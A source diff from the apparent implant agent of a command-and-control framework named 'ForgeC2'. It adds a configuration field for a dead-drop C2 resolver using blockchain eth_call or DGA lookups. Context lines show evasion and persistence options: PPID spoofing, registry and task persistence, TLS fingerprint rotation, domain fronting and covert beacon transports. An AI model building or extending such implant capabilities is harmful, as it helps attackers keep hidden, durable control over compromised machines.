@@ -84,6 +84,7 @@ var (
 	PPIDSpoofParent         string            = "explorer.exe" // Parent process name used for PPID spoofing
 	PersistencePrefixStr    string            = ""             // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
 	BeaconTransportStr      string            = "http"         // "http", "wss", "ssh" — transport protocol for beacon
+	C2ResolverStr           string            = ""             // dead-drop C2 resolver JSON (chain eth_call / dga); "" = use compiled-in C2 list only
 	ChameleonStr            string            = "false"        // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
 	ChameleonProfileStr     string            = "random"       // chrome|firefox|safari|edge|ios|android|360|qq|random or a full utls profile name; also FORGEC2_CHAMELEON_PROFILE at runtime
 	SMBPipeName             string            = ""             // named pipe name for SMB transport (defaults to persistencePrefix)
@@ -272,6 +273,7 @@ type agentConfigBlob struct {
 	WorkingEnd       string `json:"work_end"`
 	WorkingTZ        string `json:"work_tz"`
 	BeaconTransport  string `json:"beacon_transport"`
+	C2Resolver       string `json:"c2_resolver"`
 	SSHUser          string `json:"ssh_user"`
 	SSHPassword      string `json:"ssh_password"`
 	SSHKey           string `json:"ssh_key"`
@@ -649,6 +651,9 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.GhostMode != "" {
 		GhostModeStr = b.GhostMode
+	}
+	if b.C2Resolver != "" {
+		C2ResolverStr = b.C2Resolver
 	}
 	if b.DomainFront != "" {
 		DomainFront = b.DomainFront
